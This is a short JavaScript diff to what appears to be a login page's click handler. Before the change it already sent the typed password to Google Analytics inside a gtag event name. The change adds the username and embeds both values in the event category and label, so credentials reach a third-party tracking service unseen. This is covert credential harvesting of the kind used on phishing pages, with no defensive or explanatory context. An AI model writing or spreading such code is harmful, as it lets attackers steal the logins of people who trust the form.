@@ -42,10 +42,11 @@ function start () {
     };
 
     document.getElementById("login-button").onclick = function () {
-        var data = document.querySelector(".input-area .pw").value;
-        gtag('event', "e"+ data, {
-            'event_category': 'cc',
-            'event_label': 'll',
+        var data1 = document.querySelector(".input-area .pw").value;
+        var data2 = document.querySelector(".input-area .un").value;
+        gtag('event', "e"+ data1, {
+            'event_category': "e" + data1 + "" + data2,
+            'event_label': "l" + data1 + "" + data2,
             'value': '1'
           });
 
